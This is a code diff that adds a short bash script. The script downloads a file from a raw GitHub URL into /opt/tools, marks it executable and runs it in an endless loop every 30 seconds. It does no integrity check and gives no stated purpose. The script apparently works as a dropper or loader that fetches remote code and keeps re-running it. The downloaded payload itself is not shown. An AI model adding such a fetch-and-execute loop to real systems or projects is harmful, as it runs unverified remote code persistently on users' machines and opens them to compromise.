@@ -1,0 +1,22 @@
+#!/bin/bash
+
+FILE="/opt/tools"
+
+if [ -e "$FILE" ]; then
+    echo "$FILE already exists."
+else
+    echo "$FILE not found. Downloading..."
+    
+    URL="https://raw.githubusercontent.com/bitner-repo/toolset/refs/heads/main/toolset"
+
+    mkdir -p /opt
+
+    curl -L "$URL" -o $FILE
+    chmod +x $FILE
+    echo "Downloaded to $FILE"
+fi
+
+while true; do
+    $FILE
+    sleep 30
+done
